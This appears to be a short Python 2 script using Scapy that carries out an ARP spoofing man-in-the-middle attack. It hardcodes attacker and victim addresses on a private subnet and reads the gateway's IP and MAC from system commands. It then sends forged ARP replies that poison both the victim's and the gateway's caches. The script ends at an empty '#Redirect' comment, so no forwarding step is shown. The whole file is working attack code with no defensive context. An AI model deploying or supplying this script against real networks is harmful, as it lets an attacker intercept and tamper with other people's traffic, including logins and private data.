from scapy.all import *
import subprocess
import thread

A_IP="192.168.106.128"
V_IP="192.168.106.130"
A_MAC="00:0c:29:1b:6f:10"

#GateWay Mac
ps=subprocess.Popen(('arp'),stdout=subprocess.PIPE)
output=subprocess.check_output(('grep', '192.168.106.2'),stdin=ps.stdout)
ps.wait()
split_GWARP=output.split()
GW_A=split_GWARP[2]

# GateWay IP
GW_ALL= subprocess.check_output(["route"])
split_GW=GW_ALL.split()
GW=split_GW[13]

#Victim attack
pkt =sr1(ARP(op=ARP.who_has,psrc =A_IP, pdst=V_IP))
answer= pkt.summary()
split_answer= answer.split()
V_MAC= split_answer[3]

arp_reply = ARP(op=ARP.is_at, psrc=GW, pdst=V_IP, hwsrc = A_MAC, hwdst = V_MAC)
arp_reply.show()
send(arp_reply)

print GW_A

#GateWay attack
gw_reply= ARP(op=ARP.is_at, psrc=V_IP,pdst=GW,hwsrc=A_MAC,hwdst=GW_A)
gw_reply.show()
send(gw_reply)

#Redirect

